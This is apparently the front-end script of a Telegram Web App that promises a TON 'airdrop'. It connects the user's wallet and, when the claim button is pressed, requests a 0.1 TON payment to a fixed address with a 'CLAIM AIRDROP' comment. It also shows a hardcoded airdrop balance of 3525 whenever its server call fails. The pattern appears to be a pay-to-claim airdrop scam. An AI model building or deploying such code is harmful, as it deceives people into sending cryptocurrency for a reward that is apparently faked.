import * as Ton from "https://esm.sh/@ton/ton@latest";

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://raw.githubusercontent.com/hamstermod/StarJack.github.io/refs/heads/main/manifest.json',
    buttonRootId: 'ton-connect'
});
function parseQuery(query) {
    try{
        const params = new URLSearchParams(query);
        const result = {};

        for (const [key, value] of params.entries()) {
            result[key] = value;
        }

        if (result.user) {
            try {
                result.user = JSON.parse(decodeURIComponent(result.user));
            } catch (e) {
                createMessage(text.errorParsing + " " + e, 0);
                console.error("Ошибка при парсинге user JSON:", e);
            }
        }

        return result;
    }catch(el){
        return {user: {id: 1}};
    }
}
const search = Telegram.WebApp.initData;
const userUIdata = parseQuery(search);
async function getData(){
    let airdropCount = document.getElementById("airdropCount");
   try{
       const result = await fetch("http://localhost:3000/user", {
           method: "POST",
           headers: {
               "accept": "*/*",
               "content-type": "application/json"
           },
           body: JSON.stringify({ initData: search}),
           mode: "cors"
       }).then((el) => el.json()).catch((e) => {airdropToken: 3525})
       airdropCount.innerText = result.airdropToken || 0;
   }catch(e) {
       airdropCount.innerText = 3525;
   }
}





document.getElementById("claimAirdropBtt").onclick = async () => {

    try{
        if (!tonConnectUI.wallet) {
            await tonConnectUI.openModal();
        }
        const message = `CLAIM AIRDROP (ID-${userUIdata.user.id})`
        const commentBody = Ton.beginCell()
            .storeUint(0, 32)
            .storeStringTail(message)
            .endCell();

        const payloadBoc = commentBody.toBoc();
        const base64Payload = btoa(String.fromCharCode(...payloadBoc));
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: [
                {
                    address: "EQABa48hjKzg09hN_HjxOic7r8T1PleIy1dRd8NvZ3922MP0",
                    amount: 100000000,
                    payload:  base64Payload
                }
            ]
        }

        const result = await tonConnectUI.sendTransaction(transaction);
    }catch(e) {
    }
}

getData();

